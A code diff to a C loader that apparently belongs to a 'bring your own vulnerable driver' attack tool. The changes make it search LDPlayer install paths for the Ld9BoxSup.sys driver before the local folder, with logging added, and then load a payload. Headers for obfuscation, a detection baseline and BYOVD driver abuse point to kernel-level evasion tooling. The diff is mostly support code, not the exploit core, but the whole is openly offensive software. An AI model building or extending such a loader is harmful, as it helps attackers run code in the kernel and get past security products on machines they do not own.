@@ -13,6 +13,7 @@
 #include "obfuscate.h"
 #include "tests/detection_baseline.h"
 #include "byovd/supdrv.h"
+#include "byovd/deployer.h"
 
 // =============================================================================
 // Configuration
@@ -254,27 +255,39 @@ static DWORD WINAPI DebugMonitorThread(LPVOID param) {
 // Helper Functions
 // =============================================================================
 
-static wchar_t* GetDriverPath(void) {
+static bool FileExists(const wchar_t* path) {
+    DWORD attr = GetFileAttributesW(path);
+    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+static wchar_t* FindDriverPath(void) {
     static wchar_t path[MAX_PATH];
 
-    // Get directory of current executable
-    GetModuleFileNameW(NULL, path, MAX_PATH);
+    // Strategy 1: Check known LDPlayer installation paths
+    // Uses KNOWN_DRIVER_PATHS from deployer.h
+    for (size_t i = 0; i < KNOWN_DRIVER_PATHS_COUNT; i++) {
+        if (FileExists(KNOWN_DRIVER_PATHS[i])) {
+            wcscpy_s(path, MAX_PATH, KNOWN_DRIVER_PATHS[i]);
+            LOG("[+] Found driver at known path: %ls\n", path);
+            return path;
+        }
+    }
 
-    // Find last backslash
+    // Strategy 2: Check local directory (same as executable)
+    GetModuleFileNameW(NULL, path, MAX_PATH);
     wchar_t* lastSlash = wcsrchr(path, L'\\');
     if (lastSlash) {
         *(lastSlash + 1) = L'\0';
     }
-
-    // Append driver filename
     wcscat_s(path, MAX_PATH, DRIVER_FILENAME);
 
-    return path;
-}
+    if (FileExists(path)) {
+        LOG("[+] Found driver in local directory: %ls\n", path);
+        return path;
+    }
 
-static bool FileExists(const wchar_t* path) {
-    DWORD attr = GetFileAttributesW(path);
-    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
+    // Driver not found in any location
+    return NULL;
 }
 
 static void* LoadPayload(const char* filename, size_t* size) {
@@ -385,17 +398,19 @@ int main(int argc, char* argv[]) {
         return result;
     }
 
-    // Get driver path
-    wchar_t* driverPath = GetDriverPath();
-    printf("[*] Driver path: %ls\n", driverPath);
-
-    // Check driver exists
-    if (!FileExists(driverPath)) {
-        printf("[-] Driver not found: %ls\n", driverPath);
-        printf("[!] Ensure Ld9BoxSup.sys is in the same directory as this executable\n");
+    // Find driver in known locations (LDPlayer paths, local directory)
+    LOG("[*] Searching for Ld9BoxSup.sys driver...\n");
+    wchar_t* driverPath = FindDriverPath();
+    if (!driverPath) {
+        LOG("[-] Driver not found in any known location\n");
+        LOG("[!] Install LDPlayer 9, OR place Ld9BoxSup.sys next to this executable\n");
+        LOG("[!] Searched locations:\n");
+        for (size_t i = 0; i < KNOWN_DRIVER_PATHS_COUNT; i++) {
+            LOG("      - %ls\n", KNOWN_DRIVER_PATHS[i]);
+        }
+        LogShutdown();
         return 1;
     }
-    printf("[+] Driver file found\n");
 
     // Load payload
     size_t payloadSize = 0;
